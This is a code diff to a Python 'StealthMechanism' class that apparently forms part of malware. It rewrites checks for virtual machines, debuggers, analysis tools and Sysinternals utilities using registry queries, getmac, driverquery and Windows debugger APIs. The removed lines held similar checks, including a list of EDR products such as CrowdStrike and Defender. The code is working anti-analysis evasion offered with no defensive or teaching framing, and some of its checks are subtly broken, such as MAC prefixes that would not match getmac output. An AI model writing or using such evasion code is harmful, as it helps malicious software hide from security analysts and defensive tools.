@@ -84,123 +84,141 @@ class StealthMechanism:
         """Enhanced virtualization detection"""
         indicators = []
         
-        # Check system info
-        system_info = platform.system() + platform.version() + platform.release()
-        vm_indicators = [
-            'VirtualBox', 'VMware', 'QEMU', 'Xen', 'KVM', 'Hyper-V',
-            'Virtual', 'VBOX', 'Parallels'
-        ]
-        indicators.append(any(v in system_info for v in vm_indicators))
-        
-        # Check processes
-        vm_processes = [
-            'vboxservice', 'vmtoolsd', 'vm3dservice', 'vmwaretray',
-            'vmwareuser', 'vgauthservice', 'vmacthlp', 'vmusrvc'
-        ]
-        for proc in psutil.process_iter(['name']):
-            if any(v in proc.info['name'].lower() for v in vm_processes):
+        # Check CPU info
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")
+            cpu_name = winreg.QueryValueEx(key, "ProcessorNameString")[0]
+            winreg.CloseKey(key)
+            
+            if any(v in cpu_name.lower() for v in ['virtual', 'vm', 'qemu']):
                 indicators.append(True)
-                
-        # Check registry for VM artifacts
-        if os.name == 'nt':
-            vm_keys = [
-                r'SYSTEM\CurrentControlSet\Services\VBoxGuest',
-                r'SYSTEM\CurrentControlSet\Services\VMware',
-                r'SYSTEM\CurrentControlSet\Services\Xen'
+        except:
+            pass
+            
+        # Check MAC address
+        try:
+            vm_macs = [
+                '00:05:69',  # VMware
+                '00:0C:29',  # VMware
+                '00:1C:14',  # VMware
+                '00:50:56',  # VMware
+                '08:00:27',  # VirtualBox
+                '00:16:3E'   # Xen
             ]
-            for key_path in vm_keys:
-                try:
-                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
-                    indicators.append(True)
-                except:
-                    pass
-                    
-        # Check MAC address prefixes
-        vm_mac_prefixes = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
-        for iface in psutil.net_if_addrs().values():
-            for addr in iface:
-                if addr.family == socket.AF_LINK:
-                    if any(addr.address.startswith(prefix) for prefix in vm_mac_prefixes):
-                        indicators.append(True)
-                        
+            
+            output = subprocess.check_output('getmac', shell=True).decode()
+            if any(mac in output for mac in vm_macs):
+                indicators.append(True)
+        except:
+            pass
+            
+        # Check system drivers
+        try:
+            vm_drivers = [
+                'vboxdrv',
+                'vboxguest',
+                'vmhgfs',
+                'vmci',
+                'vmhgfs',
+                'vmmouse',
+                'vmscsi',
+                'vmx86',
+                'vmnet'
+            ]
+            
+            output = subprocess.check_output('driverquery', shell=True).decode()
+            if any(driver in output.lower() for driver in vm_drivers):
+                indicators.append(True)
+        except:
+            pass
+            
         return any(indicators)
         
     def _check_debugging(self) -> bool:
         """Enhanced debugging detection"""
-        indicators = []
-        
-        # Check for common debugging tools
-        debug_processes = [
-            'wireshark', 'tcpdump', 'ida64', 'ollydbg', 'x64dbg',
-            'processhacker', 'processexplorer', 'procmon', 'pestudio',
-            'immunity debugger', 'radare2', 'ghidra', 'dnspy', 'cheatengine'
+        try:
+            # Check for debugger using Windows API
+            if self.kernel32.IsDebuggerPresent():
+                return True
+                
+            # Check remote debugger
+            isDebuggerPresent = ctypes.c_bool()
+            self.kernel32.CheckRemoteDebuggerPresent(
+                self.kernel32.GetCurrentProcess(),
+                ctypes.byref(isDebuggerPresent)
+            )
+            if isDebuggerPresent.value:
+                return True
+                
+            # Check debug port
+            class SYSTEM_KERNEL_DEBUGGER_INFORMATION(ctypes.Structure):
+                _fields_ = [
+                    ("KernelDebuggerEnabled", ctypes.c_bool),
+                    ("KernelDebuggerNotPresent", ctypes.c_bool),
+                ]
+                
+            system_info = SYSTEM_KERNEL_DEBUGGER_INFORMATION()
+            status = self.ntdll.NtQuerySystemInformation(
+                0x23,  # SystemKernelDebuggerInformation
+                ctypes.byref(system_info),
+                ctypes.sizeof(system_info),
+                None
+            )
+            
+            if status == 0:  # STATUS_SUCCESS
+                return system_info.KernelDebuggerEnabled or not system_info.KernelDebuggerNotPresent
+                
+            return False
+        except:
+            return False
+            
+    def _check_monitoring(self) -> bool:
+        """Enhanced monitoring tools detection"""
+        monitoring_processes = [
+            'procexp64',
+            'procexp',
+            'procmon',
+            'procmon64',
+            'wireshark',
+            'fiddler',
+            'tcpview',
+            'autoruns',
+            'autorunsc',
+            'filemon',
+            'regmon',
+            'processhacker',
+            'processhacker2',
+            'apimonitor-x86',
+            'apimonitor-x64'
         ]
         
-        for proc in psutil.process_iter(['name', 'cmdline']):
-            try:
-                if any(d in proc.info['name'].lower() for d in debug_processes):
-                    indicators.append(True)
-                if proc.info['cmdline']:
-                    if any(d in ' '.join(proc.info['cmdline']).lower() for d in debug_processes):
-                        indicators.append(True)
-            except:
-                continue
-                
-        # Check for debugging ports
-        debug_ports = [1234, 1337, 9999, 31337]  # Common debug ports
-        for port in debug_ports:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
-                if sock.connect_ex(('127.0.0.1', port)) == 0:
-                    indicators.append(True)
-                sock.close()
-            except:
-                continue
-                
-        # Windows-specific checks
-        if os.name == 'nt':
-            try:
-                # Check for debugger using Windows API
-                if self.kernel32.IsDebuggerPresent():
-                    indicators.append(True)
-                    
-                # Check remote debugger
-                is_remote = ctypes.c_bool()
-                if self.kernel32.CheckRemoteDebuggerPresent(
-                    self.kernel32.GetCurrentProcess(), ctypes.byref(is_remote)
-                ):
-                    if is_remote.value:
-                        indicators.append(True)
+        try:
+            # Check running processes
+            for proc in psutil.process_iter(['name', 'exe']):
+                try:
+                    if any(mon in proc.info['name'].lower() for mon in monitoring_processes):
+                        return True
                         
-                # Check for hardware breakpoints
-                context = ctypes.c_ulong()
-                if self.kernel32.GetThreadContext(
-                    self.kernel32.GetCurrentThread(), ctypes.byref(context)
-                ):
-                    if context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3:
-                        indicators.append(True)
+                    # Check process path for analysis tools
+                    if proc.info['exe']:
+                        if any(tool in proc.info['exe'].lower() for tool in ['\\analysis\\', '\\sandbox\\', '\\malware\\']):
+                            return True
+                except:
+                    continue
+                    
+            # Check for Sysinternal's tools registry key
+            try:
+                winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                    "Software\\Sysinternals")
+                return True
             except:
                 pass
                 
-        return any(indicators)
-        
-    def _check_monitoring(self) -> bool:
-        """Check for monitoring tools and EDR solutions"""
-        monitoring_services = [
-            'sysmon', 'crowdstrike', 'carbonblack', 'sophos', 'symantec',
-            'mcafee', 'cylance', 'sentinel', 'elastic', 'fireeye', 'defender'
-        ]
-        
-        for service in psutil.win_service_iter():
-            try:
-                if any(m in service.name().lower() for m in monitoring_services):
-                    return True
-            except:
-                continue
-                
-        return False
-        
+            return False
+        except:
+            return False
+            
     def _check_analysis(self) -> bool:
         """Check for analysis tools and environment"""
         indicators = []
